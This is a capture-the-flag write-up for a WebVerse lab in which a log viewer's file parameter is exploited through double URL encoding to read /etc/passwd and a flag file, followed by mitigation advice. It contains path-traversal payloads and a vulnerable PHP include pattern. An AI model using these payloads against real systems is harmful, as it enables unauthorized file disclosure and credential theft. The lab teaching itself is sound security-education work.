---
title: "Local File Inclusion via Double URL Encoding | Mirage"
date: 2026-05-27 10:00:00 +0530
categories: [A02 - Security Misconfiguration, Local File Inclusion]
tags: [webverselabs-pro, lfi, path-traversal, double-encoding, file-disclosure, information-disclosure, web-security]
platform: WebVerse Labs
author: Shivansh Sharma
image:
  path: /assets/images/posts/mirage.webp
  alt: Mirage Local File Inclusion via Double URL Encoding
---

## Lab Link

Lab: [Herbalist Remedies](https://dashboard.webverselabs-pro.com/challenges/mirage)

---

## Overview

**Mirage** targets a vulnerable log viewer feature within the fictional NovaPan hosting control panel.

The application allows users to view server log files through a `file` parameter. Although the developers attempted to harden the input validation logic, the protection can be bypassed through **double URL encoding**, allowing an attacker to traverse directories and read arbitrary files from the server.

This results in a **Local File Inclusion (LFI)** vulnerability that ultimately exposes sensitive files stored outside the intended log directory.

---

## Objective

Exploit the vulnerable log viewer to access files outside the application's intended directory and retrieve the flag.

---

## Scenario

> NovaPan is a self-hosted hosting control panel founded in 2016 and bundled by a handful of European budget hosts, with licences starting at $9/month per server and somewhere around 30,000 active installs. The log-viewer feature was refactored two releases ago when a community contributor sent in a patch hardening the input handler, and the third-party auditors marked it "low risk" after running their usual checklist against it. The contributor's patch did exactly what its commit message said it did, and nothing more.

---

## Reconnaissance

The application exposes a log viewer:

```text
https://c1427185-4065-mirage-042b4.challenges.webverselabs-pro.com/logs
```

Selecting a log file generates requests such as:

```text
https://c1427185-4065-mirage-042b4.challenges.webverselabs-pro.com/logs/view?file=access.log
```

The presence of a user-controlled file parameter immediately suggests possible file inclusion or path traversal vulnerabilities.

---

## Initial Testing

A common first step is attempting directory traversal payloads:

```text
../../../etc/passwd
```

```text
....//....//....//etc/passwd
```

```text
..%2f..%2f..%2fetc/passwd
```

However, these payloads were blocked by the application's filtering logic.

This indicates that some form of input validation or path sanitization is being applied before file access occurs.

---

## Vulnerability Analysis

The filtering logic appeared to inspect the input before it was fully decoded.

As a result, traversal characters could be hidden using **double URL encoding**.

For example:

```text
/
```

becomes:

```text
%2f
```

and then:

```text
%252f
```

after a second encoding pass.

If the application validates input before complete decoding occurs, the traversal payload may bypass filtering and become dangerous only after later processing stages.

---

## Exploitation

### Step 1: Confirm Arbitrary File Access

A heavily nested double-encoded traversal payload was supplied.

Example:

```text
%252f%252f%252f%252f%252f%252f%252f%252f...
```

followed by:

```text
/etc/passwd
```

Resulting payload:

```text
%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f/etc/passwd
```

The application successfully returned the contents of:

```text
/etc/passwd
```

confirming Local File Inclusion.

---

## Step 2: Locate the Flag

After confirming arbitrary file access, replace the target file:

```text
/etc/passwd
```

with:

```text
/flag.txt
```

Payload:

```text
%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f%252f/flag.txt
```

---

## Proof of Exploitation

The application returns:

```text
WEBVERSE{.....}
```

demonstrating successful file disclosure through Local File Inclusion.

---

## Impact

Successful exploitation allows attackers to:

- Read arbitrary files
- Access application source code
- Retrieve configuration files
- Extract credentials
- Read API keys and secrets
- Access internal documentation
- Leak environment variables
- Gather information for further attacks

In real-world environments, LFI vulnerabilities frequently lead to full system compromise when combined with log poisoning, file upload abuse, or remote code execution primitives.

---

## Root Cause

The application relies on insufficient path validation.

The intended behavior was likely:

```php
$file = $_GET['file'];
include("/var/logs/" . $file);
```

with filtering applied before complete decoding.

Because the application performs multiple decoding operations, attackers can conceal traversal characters through double encoding.

The security control validates one representation of the input while the file access logic processes another.

---

## Mitigation

### Canonicalize Input Before Validation

Decode user input completely before performing security checks.

Incorrect:

```php
validate($input);
urldecode($input);
```

Correct:

```php
$input = urldecode($input);
validate($input);
```

---

### Use Allowlists

Only permit explicitly approved log files.

Example:

```php
$allowed = [
    "access.log",
    "error.log"
];
```

---

### Prevent Path Traversal

Reject:

```text
../
..\
%2e%2e/
%252e%252e/
```

and similar traversal sequences.

---

### Store Sensitive Files Outside Web Reach

Critical files such as:

```text
.env
flag.txt
config.php
```

should not be accessible through application-controlled file paths.

---

### Use Real Path Validation

Resolve the final path and ensure it remains inside the intended directory.

Example:

```php
realpath()
```

verification can prevent traversal attacks.

---

## Real-World Insight

Double-encoding bypasses continue to appear in production applications because developers often validate encoded user input before it reaches its final decoded form. Attackers exploit differences between filtering, routing, and filesystem processing layers to bypass protections that appear secure during superficial testing.

Many historical LFI and path traversal vulnerabilities have relied on similar encoding discrepancies.

---

## Vulnerability Identification

This challenge is primarily a **Local File Inclusion (LFI)** vulnerability.

### Classification Hierarchy

**OWASP Top 10:2025**

```text
A02 - Security Misconfiguration
 └── Path Traversal
      └── Local File Inclusion (LFI)
           └── Arbitrary File Read
```

### CWE Mapping

```text
CWE-22
Improper Limitation of a Pathname to a Restricted Directory
(Path Traversal)
```

---

## Key Takeaway

Filtering user input is ineffective when validation occurs before all encoding layers are processed. Double URL encoding can transform seemingly harmless input into dangerous filesystem paths, allowing attackers to bypass filters and read arbitrary files through Local File Inclusion vulnerabilities.